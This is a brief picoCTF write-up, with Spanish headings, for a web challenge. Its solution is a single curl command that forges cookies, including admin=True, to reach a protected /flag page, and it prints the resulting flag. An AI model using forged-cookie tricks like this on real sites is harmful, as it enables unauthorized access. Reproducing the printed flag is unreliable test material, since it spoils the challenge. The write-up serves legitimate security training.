## Objetivo
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/44573/` ([link](https://jupiter.challenges.picoctf.org/problem/44573/)) or http://jupiter.challenges.picoctf.org:44573

## Solución
Desde la consola
```bash
curl [https://jupiter.challenges.picoctf.org/problem/44573/flag](https://jupiter.challenges.picoctf.org/problem/44573/flag) -H 'Cookie: password=hola; username=Juan; admin=True' | grep picoCTF
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1312  100  1312    0     0   4689      0 --:--:-- --:--:-- --:--:--  4702
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_0c98aacc}</code></p> 
```
## Notas adicionales
## Referencias
[Cookie](https://es.wikipedia.org/wiki/Cookie_(inform%C3%A1tica))
